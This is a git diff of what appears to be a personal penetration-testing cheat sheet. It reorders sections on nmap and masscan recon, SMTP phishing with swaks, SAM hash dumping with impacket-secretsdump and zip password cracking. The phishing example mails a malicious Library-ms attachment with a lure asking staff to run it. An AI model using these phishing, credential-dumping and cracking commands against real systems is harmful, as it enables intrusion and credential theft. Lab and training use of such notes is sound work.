@@ -155,10 +155,7 @@ nmap -sS 10.11.1.111
 nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full 10.11.1.111
 
 # Autorecon
-python3 autorecon.py 10.11.1.111
-
-# NmapAutomator
-nmapAutomator.sh -H 192.168.86.125 -t All
+sudo python3 autorecon.py 10.11.1.111 -vv
 
 #Scan All the ports:
 masscan -p1-65535,U:1-65535 --rate=1000 192.168.232.43 -e tun0 > ports
@@ -183,11 +180,8 @@ responder -I eth0 -A
 amass enum -ip 10.11.1.1/24
 
 ```
-- sparta
-- `python /root/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.11.1.111 -o test --services`
 
-
-## Enumeration AIO
+## Enumeration 
 [Penetration Testing Methodology - 0DAYsecurity.com](http://0daysecurity.com/penetration-testing/enumeration.html)
 
 ## File enumeration
@@ -373,13 +367,22 @@ python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/d
 ```
 
 ## Port 25 - SMTP
-
+```
 https://book.hacktricks.xyz/pentesting/pentesting-smtp#basic-information
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
 https://www.hackercoolmagazine.com/smtp-enumeration-with-kali-linux-nmap-and-smtp-user-enum/
+```
+# Sending an email with swaks example:
+```
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 
+Requirement: SMTP (Usually port 25) usually works.
 
-REF:Postfish
+Body.txt:
+
+Please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+John
 ```
 
 SMTP Server Commands:
@@ -655,19 +658,6 @@ smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -c
 </searchConnectorDescriptionList>
 </libraryDescription>
 
-Sending an email with swaks example:
-
-sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
-
-Requirement: SMTP (Usually port 25) usually works.
-
-Body.txt:
-
-Hey!
-
-On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
-
-John
 
 ```
 ## Port 143/993 IMAP
@@ -1527,6 +1517,33 @@ hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.
 https://github.com/LandGrey/pydictor
 https://github.com/Mebus/cupp
 git clone https://github.com/sc0tfree/mentalist.git
+
+# Cracking Zip Files
+```
+Cracking Zip File:
+	fcrackzip -u -D -p /home/kali/Documents/crack/rockyou.txt SomeZip.backup
+
+Converting Zip To Hash:
+	zip2john back.zip > zip.txt
+
+Cracking:
+	john --wordlist=/home/kali/Documents/crack/rockyou.txt zip.txt
+
+```
+
+# Cracking SAM Hashes
+```
+ 	Needed: 1) SAM file 2) SYSTEM file	
+	Location: 
+ 	1) C:\Windows\system32\SAM
+  	2) C:\Windows\system32\SYSTEM
+
+	Transfer them to Kali. then crack with impacket-secretsdump
+	proxychains impacket-secretsdump local -sam SAM -system SYSTEM
+	Format will be something like: tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+
+```
+
 ```
 John
 ```
@@ -1560,7 +1577,6 @@ https://crackstation.net/
 https://crack.sh/
 https://hash.help/
 https://passwordrecovery.io/
-http://cracker.offensive-security.com/
 ```
 
 # **Vulnerability analysis**
@@ -3099,20 +3115,6 @@ Note: I had to add this entry into the proxychains4.conf file:
 Note 2: If you get a notice that the port is in use, even after you have killed the process.
 	You can manually kill the zombie process to free the port
 ```
-
-# Cracking SAM Hashes
-```
- 	Needed: 1) SAM file 2) SYSTEM file	
-	Location: 
- 	1) C:\Windows\system32\SAM
-  	2) C:\Windows\system32\SYSTEM
-
-	Transfer them to Kali. then crack with impacket-secretsdump
-	proxychains impacket-secretsdump local -sam SAM -system SYSTEM
-	Format will be something like: tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
-
-```
-
   
   # Command Injection
 	Reference:
@@ -3157,19 +3159,6 @@ Note 2: If you get a notice that the port is in use, even after you have killed 
 		git show
 	Show differences:
 		git diff
-```
-
-# Cracking Zip Files
-```
-Cracking Zip File:
-	fcrackzip -u -D -p /home/kali/Documents/crack/rockyou.txt SomeZip.backup
-
-Converting Zip To Hash:
-	zip2john back.zip > zip.txt
-
-Cracking:
-	john --wordlist=/home/kali/Documents/crack/rockyou.txt zip.txt
-
 ```
 
 # AD Exploitation Checklist
